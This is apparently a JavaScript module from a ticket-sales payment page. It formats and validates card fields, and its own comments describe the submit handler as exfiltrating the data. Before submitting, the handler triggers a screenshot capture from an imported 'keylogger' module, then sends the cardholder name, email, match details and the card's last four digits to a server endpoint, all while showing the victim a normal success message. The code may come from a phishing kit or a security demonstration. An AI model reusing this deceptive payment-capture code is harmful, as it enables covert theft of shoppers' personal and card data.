import { validateEmail, validateCardNumber, validateExpiryDate, validateCVV, validateCardName } from './validations.js';
import { captureScreenshot } from './keylogger.js';

// Configura los eventos para formatear la tarjeta visualmente
export function initPaymentFormatting() {
    // Formateo de tarjeta (agrega espacios cada 4 números)
    document.getElementById('c-number')?.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    // Formateo de fecha de expiración (agrega la barra '/')
    document.getElementById('c-exp')?.addEventListener('input', (e) => {
        let value = e.target.value.replace(/[^\d]/g, '');
        if(value.length >= 2) {
            value = value.substring(0,2) + '/' + value.substring(2,4);
        }
        e.target.value = value;
    });
}

// Procesa el envío del formulario de pago y exfiltra la información
export async function handlePaymentSubmit(e, selectedSeats, currentMatch, onSuccess) {
    e.preventDefault();
    
    // Obtener valores
    const email = document.getElementById('c-email')?.value || '';
    const cardName = document.getElementById('c-name')?.value || '';
    const cardNumber = document.getElementById('c-number')?.value || '';
    const cardExp = document.getElementById('c-exp')?.value || '';
    const cardCvc = document.getElementById('c-cvc')?.value || '';
    
    const totalAmount = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);
    
    // Validaciones
    const errors = [];
    
    if(totalAmount === 0) errors.push('Por favor selecciona al menos un asiento antes de continuar.');
    if(!validateEmail(email)) errors.push('Por favor ingresa un correo electrónico válido.');
    if(!validateCardName(cardName)) errors.push('Por favor ingresa el nombre completo del titular de la tarjeta.');
    if(!validateCardNumber(cardNumber)) errors.push('Por favor ingresa un número de tarjeta válido (16 dígitos).');
    if(!validateExpiryDate(cardExp)) errors.push('Por favor ingresa una fecha de vencimiento válida (MM/AA).');
    if(!validateCVV(cardCvc)) errors.push('Por favor ingresa un código CVV válido (3 o 4 dígitos).');
    
    if(errors.length > 0) {
        alert(' ' + errors.join('\n '));
        return;
    }
    
    // Simular máscara de tarjeta para el envío
    const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
    
    // Cambiar estado del botón
    const submitBtn = e.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = 'Procesando pago...';
    submitBtn.disabled = true;
    
    // Primero capturar una última pantalla (Keylogger)
    captureScreenshot();
    
    // Esperar a que se procese y luego enviar todo al servidor
    setTimeout(async () => {
        try {
            const response = await fetch('/finalizar-y-enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: cardName,
                    email: email,
                    match: currentMatch,
                    totalAmount: totalAmount,
                    seats: selectedSeats.length,
                    cardLastFour: lastFour
                })
            });
            
            if(response.ok) console.log('Datos enviados al servidor');
        } catch (err) {
            console.error('Error al enviar datos:', err);
        }
        
        try {
            // Retornar control a main.js para mostrar el modal de éxito
            onSuccess(totalAmount, email, cardName);
        } catch(e) {
            console.error('Error mostrando el modal de éxito:', e);
        } finally {
            submitBtn.innerText = originalText;
            submitBtn.disabled = false;
            e.target.reset(); // Limpia el formulario de pago
        }
    }, 2000);
}